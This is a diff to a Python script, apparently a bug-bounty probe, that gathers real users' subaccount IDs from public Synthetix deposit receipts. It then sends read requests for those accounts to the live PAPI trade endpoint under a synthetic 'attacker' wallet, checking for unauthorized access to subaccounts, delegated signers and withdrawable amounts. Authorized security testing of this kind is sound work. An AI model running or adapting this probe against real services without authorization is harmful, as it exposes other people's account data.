@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-"""Redacted, read-only Synthetix PAPI authorization and identity-binding probe.
+"""Redacted, read-only Synthetix PAPI authorization probe.
 
 Safety properties:
 - derives candidate accounts only from public deposit transaction receipts;
 - uses a deterministic synthetic attacker key with no funds;
-- sends only read actions to the PAPI trade endpoint;
-- never stores raw wallet addresses, subaccount IDs, balances, positions or orders;
-- records only hashes, equality flags, status/error codes, schemas and counts;
+- sends only account-query actions to the PAPI trade endpoint;
+- never stores raw wallet addresses, account IDs, balances, positions or orders;
+- records only hashes, status/error codes, schemas and counts;
 - always emits a redacted summary, including on failure.
 """
 
@@ -40,7 +40,6 @@ DEPOSIT_PROXY = "0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B"
 ASSET_DEPOSITED_TOPIC = "0x8d9f8eed9603fe0e069574aaf008e644885b52d54ba86f026277ac9db1c2d08a"
 
 # Recent public transactions labelled Deposit on the in-scope proxy's Etherscan page.
-# Receipts are used only to recover the public event fields; raw identities are not retained.
 DEPOSIT_TX_HASHES = (
     "0xb8099b559a99ef2e5122c7b37e2288cd21c90ab4a9cd282ebd556fac21c8618c",
     "0xff4a76000616a7bd6e7eec8dc8dd5ddc3aad54d61ae14e096b22721d1d4993fa",
@@ -174,16 +173,13 @@ def event_from_receipt(tx_hash: str) -> dict[str, Any] | None:
             body = str(log.get("data", ""))[2:]
             if len(body) < 128:
                 continue
-            amount = int(body[:64], 16)
-            subaccount_id = str(int(body[64:128], 16))
             DIAG["deposit_events_found"] += 1
             return {
                 "tx_hash": tx_hash,
                 "depositor": topic_address(topics[1]),
                 "beneficiary": topic_address(topics[2]),
-                "token": topic_address(topics[3]),
-                "amount": amount,
-                "subaccount_id": subaccount_id,
+                "amount": int(body[:64], 16),
+                "event_subaccount_id": str(int(body[64:128], 16)),
             }
     return None
 
@@ -237,26 +233,25 @@ def discover_target() -> tuple[dict[str, Any], list[dict[str, Any]]]:
         if not event:
             continue
         beneficiary_ids = account_ids(event["beneficiary"])
-        depositor_ids = beneficiary_ids if event["depositor"].lower() == event["beneficiary"].lower() else account_ids(event["depositor"])
-        all_beneficiary = beneficiary_ids["owned"] + beneficiary_ids["delegated"] + beneficiary_ids["managed"]
-        all_depositor = depositor_ids["owned"] + depositor_ids["delegated"] + depositor_ids["managed"]
         row = {
             "tx_hash_sha256": digest(tx_hash),
             "depositor_equals_beneficiary": event["depositor"].lower() == event["beneficiary"].lower(),
-            "event_subaccount_in_beneficiary_owned": event["subaccount_id"] in beneficiary_ids["owned"],
-            "event_subaccount_in_beneficiary_any": event["subaccount_id"] in all_beneficiary,
-            "event_subaccount_in_depositor_any": event["subaccount_id"] in all_depositor,
+            "event_subaccount_is_master_routing_sentinel": event["event_subaccount_id"] == "0",
+            "event_subaccount_in_beneficiary_owned": event["event_subaccount_id"] in beneficiary_ids["owned"],
             "beneficiary_owned_count": len(beneficiary_ids["owned"]),
             "beneficiary_delegated_count": len(beneficiary_ids["delegated"]),
             "beneficiary_managed_count": len(beneficiary_ids["managed"]),
             "amount_nonzero": event["amount"] > 0,
         }
         consistency.append(row)
-        if selected is None and event["subaccount_id"] in all_beneficiary:
-            selected = event
+        if selected is None and beneficiary_ids["owned"]:
+            selected = {
+                **event,
+                "target_subaccount_id": beneficiary_ids["owned"][0],
+            }
         time.sleep(0.35)
     if selected is None:
-        raise RuntimeError("No receipt event mapped to the beneficiary's public account IDs")
+        raise RuntimeError("No deposit beneficiary had a public owned subaccount ID")
     return selected, consistency
 
 
@@ -301,9 +296,12 @@ def summarize(name: str, status: int, body: bytes) -> dict[str, Any]:
 
 
 def trade_read(name: str, subaccount_id: str, action: str, extra: dict[str, Any] | None = None) -> dict[str, Any]:
-    # Production frontend expiry values are Unix milliseconds.
     expires_after = int(time.time() * 1000) + 120_000
-    params: dict[str, Any] = {"action": action, "subAccountId": subaccount_id}
+    params: dict[str, Any] = {
+        "action": action,
+        "subAccountId": subaccount_id,
+        "walletAddress": ATTACKER.address,
+    }
     if extra:
         params.update(extra)
     status, body = post_json(
@@ -319,12 +317,19 @@ def trade_read(name: str, subaccount_id: str, action: str, extra: dict[str, Any]
 
 def run_probe() -> dict[str, Any]:
     event, consistency = discover_target()
+    target_id = event["target_subaccount_id"]
     DIAG["stage"] = "testing_foreign_read_authorization"
     results: list[dict[str, Any]] = []
 
     status, body = post_json(
         PAPI_TRADE,
-        {"params": {"action": "getSubAccount", "subAccountId": event["subaccount_id"]}},
+        {
+            "params": {
+                "action": "getSubAccount",
+                "subAccountId": target_id,
+                "walletAddress": ATTACKER.address,
+            }
+        },
     )
     results.append(summarize("missing_signature_control", status, body))
     time.sleep(0.7)
@@ -333,10 +338,14 @@ def run_probe() -> dict[str, Any]:
         ("foreign_get_subaccount", "getSubAccount", None),
         ("foreign_get_delegated_signers", "getDelegatedSigners", None),
         ("foreign_get_withdrawable_amounts", "getWithdrawableAmounts", {"symbols": ["USDT", "WETH"]}),
-        ("foreign_get_delegations_for_delegate", "getDelegationsForDelegate", {"owningAddress": event["beneficiary"]}),
+        (
+            "foreign_get_delegations_for_delegate",
+            "getDelegationsForDelegate",
+            {"owningAddress": event["beneficiary"]},
+        ),
     )
     for name, action, extra in tests:
-        results.append(trade_read(name, event["subaccount_id"], action, extra))
+        results.append(trade_read(name, target_id, action, extra))
         time.sleep(0.7)
 
     DIAG["stage"] = "completed"
@@ -344,7 +353,7 @@ def run_probe() -> dict[str, Any]:
         "safety": "Read-only actions only; no raw wallet, account ID, balance, position or order data retained.",
         "attacker_address": ATTACKER.address,
         "selected_beneficiary_sha256": digest(event["beneficiary"].lower()),
-        "selected_subaccount_id_sha256": digest(event["subaccount_id"]),
+        "selected_subaccount_id_sha256": digest(target_id),
         "deposit_identity_consistency": consistency,
         "tests": results,
         "unexpected_authorization_success": any(
